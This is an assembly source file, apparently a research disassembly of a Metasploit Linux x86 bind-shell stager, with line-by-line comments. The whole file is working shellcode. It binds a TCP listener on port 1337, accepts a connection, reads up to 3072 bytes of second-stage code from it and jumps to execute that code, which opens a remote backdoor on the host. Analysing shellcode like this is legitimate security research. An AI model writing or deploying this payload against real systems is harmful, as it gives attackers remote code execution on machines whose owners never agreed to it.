; Filename: msf_non_bind_shell.nasm
; Author: Metasploit
; Analysed by Re4son <re4son [at] whitedome.com.au>
; Purpose: Disassembly of msf linux/x86/shell/bind_nonx_tcp
;          for research purpose


global _start           

section .text

_start:

    ; --- socket - create an endpoint for communication ---
    ; int socket(int domain, int type, int protocol)

    xor    ebx,ebx	; zero out ebx
    push   ebx          ; push IPPROTO = 0
    inc    ebx
    push   ebx          ; push SOCK_STREAM=1
    push   0x2          ; push AF_INET=2
    push   0x66 	; put sys_socketcall
    pop    eax		;  into eax
    cdq			; zero out edx
    mov    ecx,esp	; store pointer to arguments in ecx
    int    0x80         ; invoke system call
    xchg   eax,esi	; store the socket file descriptor in esi


    ; --- bind - bind a name to a socket ---
    ; int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen)

    inc ebx	    	; increase the sub call function number to 2 for bind
    push edx        	; INADDR_ANY
    push word 0x3905	; port 1337 in little endian
    push word bx   	; AF_INET
    mov ecx, esp    	; store pointer to the structure in ecx
    push   0x66 	; put sys_socketcall
    pop    eax		;  into eax
    push eax         	; and use it as sizeof(struct sockaddr_in)
    push ecx        	; &serv_addr
    push esi        	; our socket descriptor
    mov ecx, esp    	; store pointer to arguments in ecx
    int 0x80        	; execute system call


    ; --- listen - listen for connections on a socket ---
    ; int listen(int sockfd, int backlog)
    mov al, 0x66   	; store sys_socketcall system call number in eax
    shl ebx,1		; increase ebx to 4 for listen sub function call number
    int 0x80        	; execute system call


    ; --- accept - accept a connection on a socket ---
    ; int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen)
    push edx        	; NULL addrlen
    push edx        	; NULL sockaddr
    push esi        	; sockfd
    inc ebx	    	; increase sub function number in bl to 5 for accept
    mov ecx, esp    	; store pointer to arguments in ecx
    mov eax, 0x66    	; store sys_socketcall system call number in eax
    int 0x80        	; execute system call
    xchg eax, ebx    	; store the new socket file descriptor in ebx for later


    ; --- read - read from a file descriptor (receive 2n stage shellcode)
    ; ssize_t read(int fd, void *buf, size_t count)
    ; note that ecx still points to our previous arguments on the stack
    ;   we'll re-use that region as buffer
    mov    dh,0xc             ; set the size to 3072 bytes
    mov    al,0x3             ; move sys_read into al
    int    0x80               ; invoke read system call


    ; transfer execution to the second stage
    mov edi,ebx		      ; store socket file descriptor in edi
    jmp ecx		      ; execute second stage